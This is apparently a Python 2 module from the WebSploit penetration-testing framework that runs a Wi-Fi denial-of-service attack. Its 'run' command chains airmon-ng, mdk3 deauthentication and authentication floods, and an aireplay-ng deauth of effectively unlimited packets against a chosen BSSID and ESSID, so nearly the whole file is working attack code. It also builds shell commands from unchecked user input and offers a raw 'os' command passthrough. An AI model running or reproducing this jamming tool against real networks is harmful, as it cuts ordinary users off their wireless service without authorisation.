#!/usr/bin/env python
#
# WebSploit FrameWork Wifi DOS Module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

import os
import subprocess
from time import sleep
from core import wcolors
from core import help
options = ["wlan0", "", "", "mon0", "11"]
def wifi_dos():
    try:
        line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
        line_1 += ":"
        line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "Wifi_Dos" + wcolors.color.ENDC
        line_1 += " > "
        com = raw_input(line_1)
        if com[0:13] == 'set interface':
            options[0] = com[14:20]
            print "INTERFACE => ", options[0]
            wifi_dos()
        elif com[0:9] == 'set bssid':
            options[1] = com[10:]
            print "BSSID => ", options[1]
            wifi_dos()
        elif com[0:9] =='set essid':
            options[2] = com[10:]
            print "ESSID => ", options[2]
            wifi_dos()
        elif com[0:7] =='set mon':
            options[3] = com[8:12]
            print "MON => ", options[3]
            wifi_dos()
        elif com[0:11] =='set channel':
            options[4] = com[12:14]
            print "CHANNEL => ", options[4]
            wifi_dos()
        elif com[0:2] =='os':
            os.system(com[3:])
            wifi_dos()
        elif com[0:4] =='help':
            help.help()
            wifi_dos()
        elif com[0:4] =='back':
            pass
        elif com[0:12] =='show options':
            print ""
            print "Options\t\t Value\t\t\t\t RQ\t Description"
            print "---------\t--------------\t\t\t----\t--------------"
            print "interface\t"+options[0]+"\t\t\t\tyes\tWireless Interface Name"
            print "bssid\t\t"+options[1]+"\t\t\t\tyes\tTarget BSSID Address"
            print "essid\t\t"+options[2]+"\t\t\t\tyes\tTarget ESSID Name"
            print "mon\t\t"+options[3]+"\t\t\t\tyes\tMonitor Mod(default)"
            print "channel\t\t"+options[4]+"\t\t\t\tyes\tTarget Channel Number"
            print ""
            wifi_dos()
        elif com[0:4] =='scan':
            cmd_0 = "airmon-ng stop " + options[3]
            subprocess.Popen(cmd_0, stdout=subprocess.PIPE , stderr=subprocess.PIPE, shell=True).wait()
            sleep(1)
            cmd_1 = "airmon-ng start " + options[0]
            subprocess.Popen(cmd_1, stdout=subprocess.PIPE , stderr=subprocess.PIPE, shell=True).wait()
            sleep(1)
            xterm_0 = "xterm -e airodump-ng " + options[3] + " &"
            os.system(xterm_0)
            wifi_dos()
        elif com[0:3] =='run':
            cmd_0 = "airmon-ng stop " + options[3]
            subprocess.Popen(cmd_0, stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell=True).wait()
            cmd_1 = "airmon-ng start " + options[0] + " " + options[4]
            subprocess.Popen(cmd_1, stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell=True).wait()
            print(wcolors.color.BLUE + "[*]Monitor Mod .... Enabled." + wcolors.color.ENDC)
            sleep(1)
            os.chdir("temp")
            os.system("xterm -e rm -rf blacklist")
            openf = "echo " + options[1] + " >>blacklist"
            os.system(openf)
            print(wcolors.color.BLUE + "[*]BlackList File .... Created." + wcolors.color.ENDC)
            sleep(1)
            xterm_1 = "xterm -e mdk3 " + options[3] + " d -b blacklist -c " + options[4] + " &"
            os.system(xterm_1)
            print(wcolors.color.BLUE + "[*]Deauthentication - Dissasocition Attack .... Started." + wcolors.color.ENDC)
            sleep(1)
            xterm_2 = "xterm -e mdk3 " + options[3] + " a -m -i " + options[1] + " &"
            os.system(xterm_2)
            print(wcolors.color.BLUE + "[*]Authentication DOS Attack .... Started." + wcolors.color.ENDC)
            sleep(1)
            xterm_3 = "xterm -e aireplay-ng --deauth 9999999999999 -o 1 -a " + options[1] + " -e " + options[2] + " " + options[3] + " &"
            os.system(xterm_3)
            print(wcolors.color.BLUE + "[*]Wifi Jamming Attack .... Started." + wcolors.color.ENDC)
            sleep(1)
            print(wcolors.color.GREEN + "[*]WIFI DOS Attack Has Been Started ..." + wcolors.color.ENDC)
            wifi_dos()
        elif com[0:4] =='stop':
            subprocess.Popen("killall aireplay", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            subprocess.Popen("killall mdk3", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            subprocess.Popen("killall xterm", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            wifi_dos()
        else:
            print "Wrong Command => ", com
    except(KeyboardInterrupt):
        print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)
